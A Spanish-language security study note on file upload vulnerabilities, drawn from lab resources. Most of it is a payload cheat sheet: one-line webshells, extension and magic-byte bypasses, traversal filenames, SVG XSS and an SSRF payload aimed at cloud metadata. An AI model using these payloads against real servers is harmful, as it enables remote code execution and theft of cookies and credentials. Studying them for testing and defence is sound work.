---
title: "File Upload Vulnerabilities"
type: note
status: active
tags:
  - seguridad
  - web
  - file-upload
  - vulnerabilidades
aliases:
  - File Upload
  - Subida de archivos
  - Webshell
created: 2026-06-13
updated: 2026-06-13
---

# File Upload Vulnerabilities

> [!INFO] Fuente
> PortSwigger File Upload, PayloadsAllTheThings.

---

## Que puede salir mal

| Problema | Impacto |
|----------|---------|
| Ejecucion de codigo (webshell) | RCE total |
| XSS via archivo | Robo de cookies |
| SSRF via SVG | Acceso a metadata cloud |
| Directory traversal | Sobrescribir archivos del sistema |
| Overwrite de archivos existentes | Denial of service, defacement |

---

## Webshell basica

### PHP

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

### ASP/ASPX

```asp
<% eval request("cmd") %>
<% response.write(server.createobject("WScript.Shell").exec("cmd /c " & request("cmd")).stdout.readall()) %>
```

### JSP

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### Python (Django/Flask)

```python
import os; print(os.popen(request.GET['cmd']).read())
```

---

## Bypass de extensiones

### Extensiones aceptadas vs peligrosas

```yaml
Seguras: .jpg, .png, .gif, .pdf, .txt, .csv
Peligrosas: .php, .asp, .aspx, .jsp, .war, .exe, .sh, .py, .pl

Zona gris:
  .php5, .phtml, .php7, .shtml, .inc
  .asa, .cer, .cdx
  .shtm, .shtml, .stm
```

### Tecnicas

```bash
# Case swapping
shell.Php
shell.pHp
shell.PHP

# Doble extension
shell.php.jpg      # Algunos servers revisan solo la ultima
shell.php.

# Null byte injection (antiguo pero a veces funciona)
shell.php%00.jpg

# Caracteres especiales
shell.php.
shell.php.
shell.php%0d%0a.jpg

# Extensiones alternativas
shell.php5
shell.phtml
shell.php7
shell.shtml
shell.inc
shell.asp
shell.asa
shell.cer
shell.jsp
shell.jspx
shell.war
```

---

## Bypass de content-type

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg          # ← Falsificar

<?php system($_GET['cmd']); ?>
------boundary--
```

---

## Bypass de magic bytes

```bash
# Algunos servidores verifican los primeros bytes del archivo
# Agregar magic bytes de imagen al inicio del webshell

# JPEG
echo -ne '\xFF\xD8\xFF\xE0' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# PNG
echo -ne '\x89\x50\x4E\x47' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# GIF
echo -ne '\x47\x49\x46\x38\x39\x61' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

---

## XSS via file upload

```html
<!-- SVG con XSS -->
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert(document.cookie)</script>
</svg>

<!-- HTML con XSS -->
<html>
<body>
<script>alert(document.cookie)</script>
</body>
</html>
```

---

## SSRF via SVG

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/>
</svg>
```

---

## Polyglot files

```bash
# Crear un archivo que es simultaneamente imagen valida + PHP webshell

# Usando exiftool
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
# Algunos servers interpretan .jpg como imagen, otros ven el PHP
```

---

## Directory traversal en filepath

```bash
# El servidor puede no sanitizar el nombre del archivo
# Subir archivo a una ruta diferente

filename: ../../var/www/html/shell.php
filename: ..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php
filename: ....//....//....//var/www/html/shell.php
```

---

## Automatizacion

```bash
# Usar Burp Intruder para fuzzear extensiones
# Wordlist: SecLists/Discovery/Web-Content/web-extensions.txt

# ffuf
ffuf -u https://target.com/FUZZ -w extensions.txt -H "Content-Type: multipart/form-data; boundary=..."
```

---

## Labs

| Recurso | Link |
|---------|------|
| PortSwigger File Upload | portswigger.net/web-security/file-upload |

---

## Ver tambien

- [[SEGURIDAD/Vulnerabilidades Web]]
- [[SEGURIDAD/XSS]]
- [[SEGURIDAD/SSRF]]
- [[SEGURIDAD/00 - INDICE]]
